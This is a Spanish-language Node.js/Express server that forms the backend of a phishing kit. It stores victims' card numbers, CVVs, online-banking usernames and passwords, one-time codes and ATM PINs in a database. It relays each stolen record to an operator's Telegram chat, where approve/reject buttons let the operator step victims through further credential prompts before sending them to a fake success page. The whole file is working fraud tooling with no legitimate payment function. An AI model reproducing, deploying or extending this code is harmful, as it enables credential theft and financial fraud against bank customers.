const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    max: 5,
    ssl: { rejectUnauthorized: false }
});

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';

async function initDB() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS pagos_pendientes (
            id               SERIAL PRIMARY KEY,
            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
            titular          VARCHAR(120),
            numero_tarjeta   VARCHAR(30),
            cvv              VARCHAR(6),
            vencimiento      VARCHAR(10),
            marca_tarjeta    VARCHAR(20),
            banco_emisor     VARCHAR(120),
            estado           VARCHAR(30) DEFAULT 'pendiente',
            motivo_rechazo   TEXT,
            redirigir_a      VARCHAR(60),
            telegram_msg_id  BIGINT,
            usuario_banco    VARCHAR(120),
            password_banco   VARCHAR(120),
            codigo_otp       VARCHAR(20),
            paso             VARCHAR(30) DEFAULT 'crear',
            fase_actual      VARCHAR(20) DEFAULT 'credenciales',
            credenciales_aprobadas BOOLEAN DEFAULT FALSE,
            otp_aprobado     BOOLEAN DEFAULT FALSE,
            created_at       TIMESTAMPTZ DEFAULT NOW(),
            updated_at       TIMESTAMPTZ DEFAULT NOW()
        );
    `);
    await pool.query(`
        ALTER TABLE pagos_pendientes
          ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
          ADD COLUMN IF NOT EXISTS password_banco VARCHAR(120),
          ADD COLUMN IF NOT EXISTS codigo_otp VARCHAR(20),
          ADD COLUMN IF NOT EXISTS paso VARCHAR(30) DEFAULT 'crear',
          ADD COLUMN IF NOT EXISTS fase_actual VARCHAR(20) DEFAULT 'credenciales',
          ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
          ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
    `);
    await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
}
initDB().catch(err => console.error('❌ initDB:', err));

async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        return await r.json();
    } catch (e) { return { ok: false }; }
}

async function tgEditMessage(messageId, text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    const body = { chat_id: CHAT_ID, message_id: messageId, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
    } catch {}
}

function construirTextoPago(pago, tipo = '') {
    let txt = `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n`;
    
    if (tipo === 'cajero') {
        txt += `\n🔑 <b>CLAVE CAJERO:</b> <code>${pago.codigo_otp || '—'}</code>\n`;
    } else {
        txt += `\n<b>── CREDENCIALES BANCO ──</b>\n` +
            `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
            `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
            `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>\n`;
    }
    txt += `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`;
    return txt;
}

app.post('/api/crear-pago', async (req, res) => {
    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
    
    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });

    try {
        // 🔥 FORZAMOS SIEMPRE EL ESTADO A 'pendiente' EN LA BASE DE DATOS
        const result = await pool.query(
            `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual, estado)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12, 'pendiente')
             ON CONFLICT (solicitud_id) DO UPDATE
               SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), estado = 'pendiente', updated_at = NOW()
             RETURNING *`,
            [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' || paso === 'cajero' ? 'otp' : 'credenciales']
        );

        const pago = result.rows[0];
        const pasoActual = (paso || 'crear').toLowerCase();

        let texto, replyMarkup;
        if (pasoActual === 'crear') {
            texto = `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` + construirTextoPago(pago);
            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Tarjeta',  callback_data: `aprobar:${pago.solicitud_id}` }, { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
        } else if (pasoActual === 'credenciales') {
            texto = `📝 <b>CREDENCIALES RECIBIDAS</b>\n\n` + construirTextoPago(pago);
            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Credenciales',  callback_data: `aprobar:${pago.solicitud_id}` }, { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
        } else if (pasoActual === 'otp') {
            texto = `🔐 <b>OTP RECIBIDO</b>\n\n` + construirTextoPago(pago);
            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Pago',  callback_data: `aprobar:${pago.solicitud_id}` }], [{ text: '🔑 Pedir Clave Cajero', callback_data: `pedir_cajero:${pago.solicitud_id}` }], [{ text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
        } else if (pasoActual === 'cajero') {
            texto = `🔑 <b>CLAVE CAJERO RECIBIDA</b>\n\n` + construirTextoPago(pago, 'cajero');
            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Clave Cajero',  callback_data: `aprobar:${pago.solicitud_id}` }, { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
        }

        const tgRes = await tgSendMessage(texto, replyMarkup);
        if (tgRes.ok && tgRes.result) {
            await pool.query(`UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`, [tgRes.result.message_id, pago.solicitud_id]);
        }

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        console.error("Error en /api/crear-pago:", err);
        return res.status(500).json({ success: false, error: 'Error al registrar' });
    }
});

app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
    try {
        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
        if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
        const row = result.rows[0];

        if (row.estado === 'aprobado_credenciales') return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
        if (row.estado === 'rechazado_credenciales') return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
        
        if (row.estado === 'pedir_cajero') return res.json({ success: true, estado: 'pedir_cajero', fase: 'otp' });
        
        // 🔥 SOLO REDIRIGE SI EL ESTADO ES 'aprobado'
        if (row.estado === 'aprobado') return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });

        // 🔥 SI NO ESTÁ APROBADO, SIEMPRE ESPERA
        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual || 'credenciales' });
    } catch (err) {
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    const cq = req.body?.callback_query;
    if (!cq || !cq.data) return;

    const [accion, solicitud_id] = cq.data.split(':');
    const msgId = cq.message?.message_id;

    try {
        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [solicitud_id]);
        if (result.rows.length === 0) return await tgAnswerCallback(cq.id, 'No encontrada');
        const pago = result.rows[0];

        if (accion === 'pedir_cajero') {
            await pool.query(`UPDATE pagos_pendientes SET estado = 'pedir_cajero', paso = 'cajero', updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
            await tgAnswerCallback(cq.id, '✅ Pidiendo Clave de Cajero');
            if (msgId) await tgEditMessage(msgId, `⌛ <b>Esperando Clave del Cajero...</b>\n\n` + construirTextoPago(pago), { inline_keyboard: [] });
            return;
        }

        if (accion === 'aprobar') {
            if (pago.paso === 'crear') {
                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado_credenciales', credenciales_aprobadas = TRUE, updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
                await tgAnswerCallback(cq.id, '✅ Tarjeta aprobada');
                if (msgId) await tgEditMessage(msgId, `✅ <b>TARJETA APROBADA</b>\n\n` + construirTextoPago(pago), { inline_keyboard: [] });
            } else {
                const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado', otp_aprobado = TRUE, fase_actual = 'completado', redirigir_a = $1, updated_at = NOW() WHERE solicitud_id = $2`, [archivo, solicitud_id]);
                await tgAnswerCallback(cq.id, '✅ Pago aprobado');
                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago), { inline_keyboard: [] });
            }
        } else if (accion === 'rechazar') {
            const esFaseFinal = (pago.paso === 'otp' || pago.paso === 'cajero');
            const motivo = esFaseFinal ? 'Clave/OTP incorrecto.' : 'Credenciales incorrectas.';
            const nuevoEstado = esFaseFinal ? 'rechazado_otp' : 'rechazado_credenciales';
            await pool.query(`UPDATE pagos_pendientes SET estado = $1, motivo_rechazo = $2, updated_at = NOW() WHERE solicitud_id = $3`, [nuevoEstado, motivo, solicitud_id]);
            await tgAnswerCallback(cq.id, '❌ Rechazado');
            if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`, { inline_keyboard: [] });
        }
    } catch (err) { console.error(err); }
});

async function registrarWebhook() {
    if (!TELEGRAM_TOKEN) return;
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
        console.log('✅ Webhook registrado');
    } catch (e) { console.error(e); }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend en puerto ${PORT}`);
    registrarWebhook();
});
